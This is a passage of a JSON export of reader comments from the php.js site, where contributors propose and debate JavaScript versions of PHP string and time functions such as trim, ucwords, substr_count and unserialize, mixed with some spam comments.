Wikipedia are geared to support these characters (and our site because we prepared for it), but they are not yet universally supported in databases, server-side languages (PHP, like JS, can handle them, but does not treat them properly until PHP6), nor text editors, etc. (even some regular 2-byte characters are not displayable in some environments though probably usually due to font support issues, since even if the technology supports Unicode, the font must also support it in order to display it; if you agree that fonts would be ideally auto-downloaded in order to give automatic full coverage of any character without developers needing to use CSS' @font-face property ( https:\/\/developer.mozilla.org\/index.php?title=En\/CSS\/%40font-face ), automatically providing fonts to the browser when the user visits a page requiring support of certain characters, add your vote to the bug report at https:\/\/bugzilla.mozilla.org\/show_bug.cgi?id=512619 )."}],"substr_count":[{"date":"2009-01-18 14:21:35","author":"antimatter15","url":"http:\/\/antimatter15.com","comment":"Wouldn't it be faster to just use split().length-1?\r\n\r\n[CODE=&quot;Javascript&quot;]function substr_count( haystack, needle, offset, length ) {\r\n  if(!isNaN(offset)){\r\n    if(!isNaN(length)){\r\n      haystack=haystack.substr(offset,length);\r\n    }else haystack = haystack.substr(offset)\r\n  }\r\n  haystack = haystack.split(needle).length-1\r\n  return haystack&lt;0?false:haystack;\r\n}[\/CODE]"},{"date":"2009-01-25 13:48:59","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Well we could benchmark it of course. But I think that when your doing this on really large strings, you also end up with really large arrays, that you really don't need. So my guess is that your approach will be more memory intensive don't you agree?"},{"date":"2009-07-20 01:25:28","author":"Shock","url":"http:\/\/freecr.ru\/","comment":"\/\/ Maybe something like that?\n[CODE]function substr_count( haystack, needle, offset, length ) {\n    if (isNaN(offset)) {\n        offset = 0;\n    }\n    if (isNaN(length)) {\n        length = haystack.length - offset;\n    }\n    if (length <= 0 || (length + offset) > haystack) {\n        return false\n    } else {\n        return haystack.substr(offset,length).split(needle).length - 1;\n    }\n}[\/CODE"},{"date":"2009-07-20 01:26:41","author":"Shock","url":"http:\/\/freecr.ru\/","comment":"\/\/ Maybe something like that?\n[CODE]function substr_count( haystack, needle, offset, length ) {\n    if (isNaN(offset)) {\n        offset = 0;\n    }\n    if (isNaN(length)) {\n        length = haystack.length - offset;\n    }\n    if (length <= 0 || (length + offset) > haystack) {\n        return false\n    } else {\n        return haystack.substr(offset,length).split(needle).length - 1;\n    }\n}[\/CODE]\n\nsorry for doublePost"},{"date":"2009-07-24 12:07:57","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Shock: I think I would have to make the same point as here:\nhttp:\/\/phpjs.org\/functions\/substr_count:559#comment_626\n\nDon't you agree?"},{"date":"2011-09-05 00:04:57","author":"Robert Eisele","url":"http:\/\/www.xarg.org\/","comment":"What about this optimization?\n\n[CODE]\nfunction substr_count(haystack, needle, offset, length) {\n\n    haystack+= \"\";\n    needle+= \"\";\n\n    if (isNaN(offset)) {\n        offset = 0;\n    }\n    if (isNaN(length)) {\n        length = haystack.length - offset;\n    }\n\n    haystack = haystack.substr(offset, length);\n\n    return (haystack.length - haystack.replace(new RegExp(needle, 'g'), \"\").length) \/ needle.length;\n}\n[\/CODE]"},{"date":"2011-10-06 15:54:33","author":"Rafal","url":"","comment":"Great!\n\n\u015awietne, bardzo mi si\u0119 przyda\u0142o.\nGreetings from Poland - Rafal\n"},{"date":"2012-04-18 10:17:38","author":"????? ????? ????","url":"http:\/\/an3m1.com\/","comment":"This is a very informative article. I was looking for these things and here I found it. I am doing a project and this information is very useful me. Some things in here I have not thought about before \n\n"},{"date":"2012-04-24 08:33:39","author":"saraanderson","url":"http:\/\/www.flowers-magzine.com\/Spring_Flowers","comment":"Really your post is really very good and I appreciate it. It\u2019s hard to sort the good from the bad sometimes, but I think you\u2019ve nailed it. You write very well which is amazing. I really impressed by your post."},{"date":"2012-04-24 19:42:46","author":"Jeremy","url":"http:\/\/hedokse.hyves.nl\/blog","comment":"I must say, useful information for users especailly for website designers.\n"},{"date":"2012-05-14 13:36:12","author":"jimmyfreaky","url":"","comment":"Hot fix rhinestones are the latest beads and fashion accessories, which are very prominent among the ladies, this is the fashion accessory that comes in the range of every woman, and its unique design makes it beautiful and stylish. <a href=\"http:\/\/www.hotfixrhinestonebeads.com\/\">wholesale hot fix rhinestones<\/a>"},{"date":"2012-05-14 13:37:22","author":"jimmyfreaky","url":"http:\/\/www.hotfixrhinestonebeads.com\/","comment":"that was amazing guyz it s very informative code i like it..."},{"date":"2012-05-15 10:12:29","author":"formal shirts","url":"http:\/\/www.formal-shirts.co.uk\/","comment":"This is s good looping code and is working as it is being told in here. Happy to learn some basics of the coding language."},{"date":"2012-09-18 04:11:49","author":"Thomas","url":"","comment":"var pos = 0 is initialized but never used."},{"date":"2012-09-18 16:12:50","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Thomas: Fixed in Git, thanks!"}],"tanh":[{"date":"2011-05-27 13:37:16","author":"Ian","url":"","comment":"it darn crashes the fucking rest of most javascript finctions"},{"date":"2011-05-28 04:04:58","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Ian: Would you mind clarifying how or why? I don't see anything wrong with this function that would cause compilation problems if that's what you mean. Anyways, the site lets you make your own package..."},{"date":"2011-09-03 13:25:56","author":"Robert Eisele","url":"http:\/\/www.xarg.org\/","comment":"I optimized the function in order to perform much faster than the original:\n\n[CODE]\nfunction tanh(x) {\n\n\tvar t = Math.exp(2 * x);\n\treturn (t - 1) \/ (t + 1);\n}\n[\/CODE]"}],"time":[{"date":"2008-07-28 19:47:20","author":"metjay","url":"","comment":"This goes even shorter:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction time() {\r\n    return Math.round(new Date().getTime()\/1000);\r\n}\r\n[\/CODE]"},{"date":"2008-08-27 16:35:02","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ metjay: fair enough, thank you!"},{"date":"2009-03-13 16:33:10","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"For the record, I thought I'd try returning \"Date.parse(new Date())\/1000;\" which is technically shorter, but it turns out quite a bit slower (parsing time I guess)\n"},{"date":"2009-09-04 17:40:29","author":"HKM","url":"","comment":"It have 1 second error because the milliseconds will be counded. Therefore, the code should be changed to that.\n[CODE]\nfunction time () {\n    return Math.floor(new Date().getTime()\/1000);\n}\n[\/CODE]\n"},{"date":"2009-09-04 19:06:12","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ HKM: Thanks for supplying the fix! Will be online shortly. Until then review at:\nhttp:\/\/github.com\/kvz\/phpjs\/commit\/459b16b6d454d4e30386729ee2640d0013449578"},{"date":"2009-11-24 16:59:56","author":"Jawad Shuaib","url":"http:\/\/jawadonweb.com","comment":"I love you guys, PHP.js has vastly improved my ability to ship code fast."},{"date":"2009-11-29 23:38:19","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Thanks Jawad, that's always nice to hear!"},{"date":"2010-07-08 18:50:14","author":"Nuked","url":"","comment":"Just to say thanks."},{"date":"2010-07-14 15:23:52","author":"OMA","url":"","comment":"Just to let you know the getTime function is pretty innacurate in Fresco (a browser used in some devices such as TV set top boxes).\n\nFor example, the date 2011\/03\/03 22:59:00, when converted in Firefox is correctly translated to 1301864340, but in Fresco, it gets translated to 1301871540, which is really 2011\/04\/03 17:59:00 (a month off!).\n\nSo maybe, for accuracy's sake in all browsers, the date to timestamp conversion should be done manually instead of relying in getTime()"},{"date":"2010-07-14 15:48:46","author":"OMA","url":"","comment":"Sorry, I think I messed up the example timestamps in my previous posts, but the accuracy problem remains..."}],"time_sleep_until":[{"date":"2009-02-02 03:25:09","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"A quick warning about this function (I'll try to add to SVN later)... This works in the PHP style of expecting a timestamp in seconds--NOT IN MILLISECONDS! So, don't try to pass in a raw JavaScript timestamp (like new Date())--which are in milliseconds, or else it will lock up the browser probably a thousand times longer than you intended! (No doubt you'd restart before that anyways (!), but, it's no fun to lock up the browser...)"},{"date":"2009-02-02 10:41:33","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: It's probably possible to detect for this kind of input since the difference between good &amp; bad input is at least 3 digits. Maybe we should sanitize it and save our users the trouble."}],"timezone_abbreviations_list":[{"date":"2011-04-16 00:36:34","author":"TimothyStewart","url":"http:\/\/tigcig.com\/fr.html","comment":""}],"trim":[{"date":"2008-02-19 19:36:38","author":"Erkekjetter","url":"","comment":"The trim() function for PHP is described as\r\nstring trim  ( string $str  [, string $charlist  ] )\r\n\r\nIn your trim(), rtrim() and ltrim() functions the second parameter charlist is missing. You might change that to have a equivalent function."},{"date":"2008-02-21 12:17:27","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Erkekjetter: Hi Erkekjetter, thanks for your input. I've found the time to recode the functions and  updated php.js accordingly."},{"date":"2008-03-20 12:47:21","author":"DxGx","url":"","comment":"[CODE=&quot;Javascript&quot;]\r\nfunction trim (str) {\r\n\tvar whitespace = ' \\n\\r\\t\\f\\x0b\\xa0\\u2000\\u2001\\u2002\\u2003\\u2004\\u2005\\u2006\\u2007\\u2008\\u2009\\u200a\\u200b\\u2028\\u2029\\u3000';\r\n\tfor (var i = 0; i &lt; str.length; i++) {\r\n\t\tif (whitespace.indexOf(str.charAt(i)) === -1) {\r\n\t\t\tstr = str.substring(i);\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n\tfor (i = str.length - 1; i &gt;= 0; i--) {\r\n\t\tif (whitespace.indexOf(str.charAt(i)) === -1) {\r\n\t\t\tstr = str.substring(0, i + 1);\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n\treturn whitespace.indexOf(str.charAt(0)) === -1 ? str : '';\r\n}\r\n[\/CODE]\r\n\r\nReplace trim function by this code. Acoding to this site: it is faster: http:\/\/blog.stevenlevithan.com\/archives\/faster-trim-javascript"},{"date":"2008-08-07 02:06:14","author":"0x0","url":"","comment":"If you also have rtrim and ltrim, you could just do this:\r\n[CODE=&quot;Javascript&quot;]\r\nfunction trim(str, charlist) {\r\n    return ltrim(rtrim(str, charlist), charlist);\r\n}\r\n[\/CODE]"},{"date":"2008-08-21 16:21:58","author":"Jack","url":"","comment":"we can avoid unnecessary string length computations by changing the &quot;for&quot; loop from\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfor (var i = 0; i &lt; str.length; i++) \r\n[\/CODE]\r\n\r\nto \r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfor (var i = 0, l=str.length; i &lt; l; i++) \r\n[\/CODE]\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction trim( str, charlist ) {\r\n   \r\n \r\n    var whitespace;\r\n    \r\n    if (!charlist) {\r\n        whitespace = ' \\n\\r\\t\\f\\x0b\\xa0\\u2000\\u2001\\u2002\\u2003\\u2004\\u2005\\u2006\\u2007\\u2008\\u2009\\u200a\\u200b\\u2028\\u2029\\u3000';\r\n    } else {\r\n        whitespace = charlist.replace(\/([\\[\\]\\(\\)\\.\\?\\\/\\*\\{\\}\\+\\$\\^\\:])\/g, '\\$1');\r\n    }\r\n  \r\n    for (var i = 0, l=str.length; i &lt; l; i++) {\r\n        if (whitespace.indexOf(str.charAt(i)) === -1) {\r\n            str = str.substring(i);\r\n            break;\r\n        }\r\n    }\r\n    for (i = str.length - 1; i &gt;= 0; i--) {\r\n        if (whitespace.indexOf(str.charAt(i)) === -1) {\r\n            str = str.substring(0, i + 1);\r\n            break;\r\n        }\r\n    }\r\n    return whitespace.indexOf(str.charAt(0)) === -1 ? str : '';\r\n}\r\n[\/CODE]"},{"date":"2008-08-27 15:08:26","author":"Ben W","url":"","comment":"Wouldn't it be better to use regex? Like one of these:\r\n\r\nhttp:\/\/blog.stevenlevithan.com\/archives\/faster-trim-javascript"},{"date":"2008-08-27 17:08:04","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ 0x0: That's definitely something to pounder about. We did not in the first place, because one of the project goals is to keep functions as standalone as reasonably possible. This duplication seemed reasonable for a standalone trim."},{"date":"2008-08-27 17:16:01","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Jack: That's a good idea, thank you, I've implemented it and credited you accordingly.\r\n\r\n@ Ben W: I will have to study on that, thanks for the input"},{"date":"2008-10-04 17:08:42","author":"Onno Marsman","url":"","comment":"Something like trim(16,1) does not work correctly.\r\n\r\nFix:\r\nAdd the following lines of code to the beginning of the function:\r\n[CODE=&quot;Javascript&quot;]\r\nstr += '';\r\ncharlist += '';\r\n[\/CODE]"},{"date":"2008-10-06 12:01:05","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsmann: Fixed, thank you!"},{"date":"2010-01-05 17:28:30","author":"zeroneta","url":"","comment":"[CODE]\n_.trim = function( a, s )\n{\n\ts = s == un ? '\\s\\n\\r\\t\\f\\x0b\\xa0\\u2000\\u2001\\u2002\\u2003\\u2004\\u2005\\u2006\\u2007\\u2008\\u2009\\u200a\\u200b\\u2028\\u2029\\u3000' : real( s );\n\treturn ( a + '' ).replace( new _._.RegExp( '(^[' + s + ']*)|([' + s + ']*$)', 'g' ), '' );\n}\n[\/CODE]\n\n[CODE]\n$.real = function( a )\n{\n\treturn ( a + '' ).replace( \/(\\$|\\^|\\*|\\(|\\)|\\-|\\+|\\||\\\\|\\{|\\[|\\}|\\]|\\,|\\.|\\?|\\\/)\/g, '\\\\$1' );\n}\n[\/CODE]"},{"date":"2010-01-05 22:11:57","author":"zeroneta","url":"","comment":"http:\/\/bgscript.com\/jscore\/script\/core.js"}],"uasort":[{"date":"2012-04-17 15:31:41","author":"????? ?????? ? ?????","url":"http:\/\/an3m1.com\/","comment":"I wonder how you got so good. HaHa ! This is really a fascinating blog, lots of stuff that I can get into. One thing I just want to say is that your design is so perfect ! You certainly know how to get a girls attention ! I\u2019m glad that you\u2019re here. I feel like I\u2019ve learned something new by being here \n"}],"ucfirst":[{"date":"2009-03-05 07:02:50","author":"Zorg","url":"","comment":"That isn't how ucfirst works in PHP, ucfirst makes the first letter of EVERY word uppercase... not just the first letter of the string."},{"date":"2009-03-08 19:55:55","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"What you're describing sounds more like ucwords().\r\nPlease check the PHP manual."},{"date":"2009-01-12 01:42:35","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Here's lcfirst... It looks like you don't need the 2nd argument to substr (also in ucfirst) when you are extracting to the end...\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction lcfirst( str ) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ *     example 1: lcfirst('Kevin Van Zonneveld');\r\n    \/\/ *     returns 1: 'kevin Van Zonneveld'\r\n \r\n    str += '';\r\n    var f = str.charAt(0).toLowerCase();\r\n    return f + str.substr(1);\r\n}\r\nalert(lcfirst('Kevin Van Zonneveld'))[\/CODE]\r\n\r\nand here's strcspn (for measuring the length of continuous sentences spoken by guests on C-SPAN):\r\n\r\n[CODE=&quot;Javascript&quot;]function strcspn (str, mask, start, length) {\r\n    start = start ? start : 0;\r\n    var count = (length &amp;&amp; ((start + length) &lt; str.length)) ? start + length : str.length;\r\n    strct:\r\n    for (var i=start, lgth=0; i &lt; count; i++) {\r\n        for (var j=0; j &lt; mask.length; j++) {\r\n            if (str[i].indexOf(mask[j]) !== -1) {\r\n                continue strct;\r\n            }\r\n        }\r\n        ++lgth;\r\n    }\r\n    return lgth;\r\n}\r\n[\/CODE]"},{"date":"2009-01-13 01:42:41","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Beautiful man. If you keep this pace you may even beat Onno ;)\r\n\r\nHm, wrong page, but strange that your previous post didn't come through. There is nothing in my spamfilter. Maybe you had different tabs open, so that captcha didn't match (there's one valid per session), and you closed the tab without noticing. Happened to me once :)"},{"date":"2010-07-26 16:43:04","author":"Lucas Souza","url":"","comment":"Thank you, man. That was really helpful."},{"date":"2011-07-16 18:49:11","author":"Dj","url":"","comment":"Why just dont use:\n[CODE]\nreturn str.charAt(0).toUpperCase() + str.substr(1);\n[\/CODE]\n\ninstead of assign the value to f to later return it"},{"date":"2011-09-13 17:17:57","author":"Dennis","url":"http:\/\/oto-studio.com","comment":"there is a mistake: the func wont turn THIS into This. So you should first make the entire string tolowercase.. fix.. publishing this comment is unnecessary"},{"date":"2011-09-14 10:53:39","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Dennis: Though I agree that could be useful in some situations, we are following PHP behavior."},{"date":"2012-04-23 14:51:39","author":"???? ????????","url":"http:\/\/an3m1.com\/","comment":"If I might \u2014perhaps you should consider adding a few images. I don\u2019t mean to disrespect what you\u2019ve said ; its very enlightening, indeed. However, I think would respond to it more positively if they could be something tangible to your ideas \n"}],"ucwords":[{"date":"2008-01-19 09:31:45","author":"Lars","url":"","comment":"thanks!"},{"date":"2008-01-19 21:02:08","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Lars: You're welcome ;)"},{"date":"2008-01-31 18:32:33","author":"_argos","url":"","comment":"Hi Kevin, I'm making a benchmark of this function using RegExp an is 25%-30% more faster than your original function, this is the bechmark that I try:\r\n\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n\/\/ _argos's function\r\nfunction ucwords_w ( str ) {\r\n\r\n\treturn str.replace(\/^(.)|\\s(.)\/g, function ( $1 ) { return $1.toUpperCase ( ); } );\r\n\r\n}\r\n\r\n\/\/ Original function\r\nfunction ucwords( str ) { \r\n    return str.toLowerCase().replace(\/\\w+\/g, function(s){\r\n        return s.charAt(0).toUpperCase() + s.substr(1);\r\n    });\r\n}\r\n\r\n\/\/ BENCHMARK\r\n \r\nvar start;\r\n\r\nstart=new Date();\r\n \r\niterations = 10000;\r\nwhile ( iterations-- ) {\r\nucwords('Kevin van Zonneveld');\r\nucwords('Waldo Malqui Silva');\r\nucwords('Alexa Valentina Malqui Cordova');\r\n}\r\n \r\nconsole.log('strrev = ' + ( (new Date())-start))\r\n\r\nstart=new Date();\r\niterations = 10000;\r\nwhile ( iterations-- ) { \r\nucwords_w('Kevin van Zonneveld');\r\nucwords_w('Waldo Malqui Silva');\r\nucwords_w('Alexa Valentina Malqui Cordova');\r\n}\r\n\r\nconsole.log( 'strrev_w = ' + ( (new Date())-start ))\r\n\r\n[\/CODE]"},{"date":"2008-01-31 19:43:34","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ _argos: That's good enough for me :) I'm replacing the function and leave the original one here for future reference:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction ucwords( str ) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Jonas Raoni Soares Silva (http:\/\/www.jsfromhell.com)\r\n    \/\/ *     example 1: ucwords('kevin van zonneveld');\r\n    \/\/ *     returns 1: 'Kevin Van Zonneveld'\r\n    \r\n    return str.toLowerCase().replace(\/\\w+\/g, function(s){\r\n        return s.charAt(0).toUpperCase() + s.substr(1);\r\n    });\r\n}\r\n[\/CODE]"},{"date":"2008-07-31 18:20:39","author":"Alessandro","url":"","comment":"It doesn't work to me on Firefox 3, it returns the same input sentence (I've used a complete uppercase sentence)..."},{"date":"2010-01-11 09:52:26","author":"Tony","url":"http:\/\/www.powerinspired.com","comment":"Great function - and picked up #1 on google search for what I was after. Saved me a host of time. Thanks"},{"date":"2010-01-25 18:41:59","author":"Robin","url":"","comment":"[CODE]\nfunction ucwords(str) {\n\treturn (str + '').replace(\/^(.)|\\s(.)\/g, function (m) {\n\t\treturn m.toUpperCase();\n\t});\n}\n[\/CODE]\n\nNow conforms to JSLint syntax conventions."},{"date":"2010-01-26 02:47:17","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Robin: Thanks for the submission, but besides differing in a variable name, your function looks identical to what we already have..."},{"date":"2010-01-28 18:24:04","author":"Robin","url":"","comment":"@Brett: Thanks for the feedback, but if you read the rest of my comment, you'll see I did not intend to change the function in any way, except to make it conform to the JSLint conventions, as shown by the \"Open syntax issues.\"\n\n\"Eventually we want all code to pass or at least take into consideration most fixes suggested by JsLint, following this JsLint configuration  we\u2019ve decided on.\"\n\nIf the previous statement no longer stands, I suggest you remove it from your website.\n\nThis isn't the first time I've tried to contribute to this site, and been met by hostility but thankfully, this will be the last, you may commence the group sigh of relief."},{"date":"2010-01-29 02:36:21","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Robin: It wasn't hostility at all! I just didn't see your notice, so I was just stating what I said in a matter of fact way, not with any sarcasm or anything. And as you say, it was my mistake for missing your additional comment. We're really sorry if you were met with hostility earlier, but sometimes I think the lack of opportunity for clarification of intent may mistakenly give that impression; if you were met with genuine hostility, or we could have been more clear or more polite, our apologies certainly for that! And yes, we are eager to make JSLint fixes, so thank you very much for the function fixes! I'll see about applying them in Git now..."},{"date":"2010-04-27 23:30:06","author":"Jerry","url":"","comment":"I prefer this slightly modified version as replacement function should ONLY be called when the regex finds suitable letters instead of suitable characters.\n[CODE]\nfunction ucwords(str) {\nreturn (str + '').replace(\/^[a-z]|\\s[a-z]\/g,\n     function ($1) {\n     return $1.toUpperCase();\n     }\n);\n}\n[\/CODE]"},{"date":"2010-04-28 04:27:05","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Jerry: A nice idea, but that only works with English letters. If we could boil it down a bit, we could incorporate XRegExp.com along with its excellent Unicode plug-in to determine whether something was lower case or not, but that would probably end up costing more performance to check for all the Unicode values (and it would need to take into account some languages which deviate from the Unicode case mapings). Off topic slightly, our function should really be made to work with locale_set_default (whenever that gets implemented!), at least when the \"unicode.semantics\" ini is on."},{"date":"2010-08-11 13:19:22","author":"James","url":"http:\/\/www.james-bell.co.uk","comment":"I have modified the regex used so that it ignores spaces and numbers, new to regex so any hints, tips, changes etc.. are welcome\n\n[code]\nfunction ucwords(str) \n{\n    str = str.toLowerCase(); \/\/Optional\n    return (str).replace(\/^([^\\s0-9])|\\s([^\\s0-9])\/g, function (l)\n   {\n        return l.toUpperCase();\n    });\n}\n[\/code]"},{"date":"2010-09-08 17:56:25","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ James: Thanks for your contribution! I modified the regex some more so it will only try to uppercase small letters (why try to uppercase '{' or '.' as well), and to support words separated by more than 1 spaces."},{"date":"2012-03-15 16:02:35","author":"acebone","url":"","comment":"This will not uppercase foreign\/extended chars, in order to do that simply replace [a-z] with [^\\s] in the regex, so that the function looks like this:\n[code]\nfunction ucwords (str) {\n    \/\/ Uppercase the first character of every word in a string  \n    \/\/ \n    \/\/ version: 1109.2015\n    \/\/ discuss at: http:\/\/phpjs.org\/functions\/ucwords    \/\/ +   original by: Jonas Raoni Soares Silva (http:\/\/www.jsfromhell.com)\n    \/\/ +   improved by: Waldo Malqui Silva\n    \/\/ +   bugfixed by: Onno Marsman\n    \/\/ +   improved by: Robin\n    \/\/ +      input by: James (http:\/\/www.james-bell.co.uk\/)    \/\/ +   improved by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\n    \/\/ *     example 1: ucwords('kevin van  zonneveld');\n    \/\/ *     returns 1: 'Kevin Van  Zonneveld'\n    \/\/ *     example 2: ucwords('HELLO WORLD');\n    \/\/ *     returns 2: 'HELLO WORLD'    return (str + '').replace(\/^([^\\s])|\\s+([^\\s])\/g, function ($1) {\n        return $1.toUpperCase();\n    });\n[\/code]"},{"date":"2012-04-04 14:37:00","author":"???? ????????","url":"http:\/\/an3m1.com\/","comment":"If I might \u2014perhaps you should consider adding a few images. I don\u2019t mean to disrespect what you\u2019ve said ; its very enlightening, indeed. However, I think would respond to it more positively if they could be something tangible to your ideas \n"}],"unserialize":[{"date":"2008-03-20 06:52:43","author":"Pedro Tainha","url":"","comment":"Hello!!!\r\n\r\nI was searching for this function in javascript a long time ago and happy to finally fond it. But when I tryed didn\u00c2\u00b4t work with me.\r\nI sent an email for the author but he didn\u00c2\u00b4t reply (probably he had no time - no problem), so i had to learn the code and find the problems.\r\nI\u00c2\u00b4m glad because i solved my problem and at the same time, because i never tryed to contribute with something, this was inspiring and i can see that probably anyone can do it as well - Don\u00c2\u00b4t be shy, try it!!! \r\n\r\n(please don\u00c2\u00b4t look at the language errors, I\u00c2\u00b4m from Portugal and I don\u00c2\u00b4t write with much frequency)\r\n\r\nNow let\u00c2\u00b4s get with the real stuff, that in reality isn\u00c2\u00b4t so much.\r\n\r\nthe lines that were changed and comented with: '\/\/changed...'\r\n\r\n1. In the array case, the code was only prepared for the number of fields less then 10, now suports any number of fields\r\n\r\n2. In the boolean case, the semicolon afther the &quot;0&quot; or &quot;1&quot; boolean variables wasn\u00c2\u00b4t cuted.\r\n\r\n\r\nThanks very much to Arpad Ray, you did a great job. This function is very useful for me!!!\r\nAnd will be for others, i will try to put a great toturial about this function and php using AJAX.\r\nI prefer this instead Json to receive data from php.\r\n\r\n\r\nThe code is above:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n\r\nfunction unserialize ( inp ) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Arpad Ray (mailto:arpad@php.net)\r\n    \/\/ *     example 1: unserialize();\r\n    \/\/ *     returns 1: ['Kevin', 'van', 'Zonneveld']\r\n\t\/\/\r\n \t\/\/*******************************************************************************\r\n\t\/\/\r\n\t\/\/ *   Reviewed at: 19\/03\/2008\r\n\t\/\/ +            by: Pedro Tainha (email@pedrotainha.com or pedrotainha@gmail.com)\r\n\t\/\/\r\n\t\/\/ Notes:\r\n\t\/\/\tFixed bugs for the cases: 'b'(boolean) and 'a'(array)\r\n\t\/\/\r\n\t\/\/*******************************************************************************\r\n\t\r\n\t\r\n    error = 0;\r\n    if (inp == &quot;&quot; || inp.length &lt; 2) {\r\n        errormsg = &quot;input is too short&quot;;\r\n        return;\r\n    }\r\n    var val, kret, vret, cval;\r\n    var type = inp.charAt(0);\r\n    var cont = inp.substring(2);\r\n    var size = 0, divpos = 0, endcont = 0, rest = &quot;&quot;, next = &quot;&quot;;\r\n \r\n    switch (type) {\r\n    case &quot;N&quot;: \/\/ null\r\n        if (inp.charAt(1) != &quot;;&quot;) {\r\n            errormsg = &quot;missing ; for null&quot;;\r\n        }\r\n        \/\/ leave val undefined\r\n        rest = cont;\r\n        break;\r\n    case &quot;b&quot;: \/\/ boolean\r\n        if (!\/[01];\/.test(cont.substring(0,2))) {\r\n            errormsg = &quot;value not 0 or 1, or missing ; for boolean&quot;;\r\n        }\r\n        val = (cont.charAt(0) == &quot;1&quot;);\r\n        rest = cont.substring(2);\t\/\/changed...\r\n        break;\r\n    case &quot;s&quot;: \/\/ string\r\n        val = &quot;&quot;;\r\n        divpos = cont.indexOf(&quot;:&quot;);\r\n        if (divpos == -1) {\r\n            errormsg = &quot;missing : for string&quot;;\r\n            break;\r\n        }\r\n        size = parseInt(cont.substring(0, divpos));\r\n        if (size == 0) {\r\n            if (cont.length - divpos &lt; 4) {\r\n                errormsg = &quot;string is too short&quot;;\r\n                break;\r\n            }\r\n            rest = cont.substring(divpos + 4);\r\n            break;\r\n        }\r\n        if ((cont.length - divpos - size) &lt; 4) {\r\n            errormsg = &quot;string is too short&quot;;\r\n            break;\r\n        }\r\n        if (cont.substring(divpos + 2 + size, divpos + 4 + size) != &quot;\\&quot;;&quot;) {\r\n            errormsg = &quot;string is too long, or missing \\&quot;;&quot;;\r\n        }\r\n        val = cont.substring(divpos + 2, divpos + 2 + size);\r\n        rest = cont.substring(divpos + 4 + size);\r\n        break;\r\n    case &quot;i&quot;: \/\/ integer\r\n    case &quot;d&quot;: \/\/ float\r\n\t\r\n        var dotfound = 0;\r\n        for (var t = 0; t &lt; cont.length; t++) {\r\n            cval = cont.charAt(t);\r\n            if (isNaN(parseInt(cval)) &amp;&amp; !(type == &quot;d&quot; &amp;&amp; cval == &quot;.&quot; &amp;&amp; !dotfound++)) {\r\n                endcont = t;\r\n                break;\r\n            }\r\n        }\r\n        if (!endcont || cont.charAt(endcont) != &quot;;&quot;) {\r\n            errormsg = &quot;missing or invalid value, or missing ; for int\/float&quot;;\r\n        }\r\n        val = cont.substring(0, endcont);\r\n        val = (type == &quot;i&quot; ? parseInt(val) : parseFloat(val));\r\n        rest = cont.substring(endcont + 1);\r\n        break;\r\n    case &quot;a&quot;: \/\/ array\r\n        if (cont.length &lt; 4) {\r\n            errormsg = &quot;array is too short&quot;;\r\n            return;\r\n        }\r\n        divpos = cont.indexOf(&quot;:&quot;, 1);\r\n\t\r\n        if (divpos == -1) {\r\n            errormsg = &quot;missing : for array&quot;;\r\n            return;\r\n        }\r\n        size = parseInt(cont.substring(1*divpos, 0));  \/\/changed...\r\n\t\r\n        cont = cont.substring(divpos + 2);\r\n        val = new Array();\r\n        if (cont.length &lt; 1) {\r\n            errormsg = &quot;array is too short&quot;;\r\n            return;\r\n        }\r\n        for (var i = 0; i + 1 &lt; size * 2; i += 2) {\r\n\t\t\t\r\n\t\t\t\r\n            kret = unserialize(cont, 1);\r\n\t\t\t\r\n            if (error || kret[0] == undefined || kret[1] == &quot;&quot;) {\r\n                errormsg = &quot;missing or invalid key, or missing value for array&quot;;\r\n                return;\r\n            }\r\n\t\t\t\r\n            vret = unserialize(kret[1], 1);\r\n\t\t\r\n            if (error) {\r\n                errormsg = &quot;invalid value for array&quot;;\r\n                return;\r\n            }\r\n            val[kret[0]] = vret[0];\r\n            cont = vret[1];\r\n        }\r\n\t\t\r\n        if (cont.charAt(0) != &quot;}&quot;) {\r\n            errormsg = &quot;missing ending }, or too many values for array&quot;;\r\n            